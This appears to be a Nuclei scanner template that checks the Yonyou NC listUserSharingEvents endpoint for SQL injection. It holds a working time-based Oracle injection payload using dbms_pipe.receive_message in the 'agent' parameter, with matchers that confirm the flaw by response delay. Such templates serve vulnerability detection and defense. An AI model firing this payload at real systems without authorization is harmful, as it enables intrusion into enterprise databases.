id: yonyou-nc-listusersharingevents-sqli

info:
  name: 用友NC系统的listUserSharingEvents接口存在SQL注入漏洞
  author: onewin
  severity: high
  description: |
    用友NC系统的listUserSharingEvents接口存在SQL注入漏洞
  reference: UFIDA-2025-059739
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - method: GET
    path: 
      - "{{BaseURL}}/portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',5)--&pageId=login&sch_ed=2&sch_sd=1"
    headers:
      X-Requested-With: "XMLHttpRequest"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"
      Accept: "application/json, text/javascript, */*; q=0.01"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3 && duration<8"
          - "status_code == 200"
        condition: and
      - type: word
        words:
          - "<share"
          - "<?xml"
        condition: and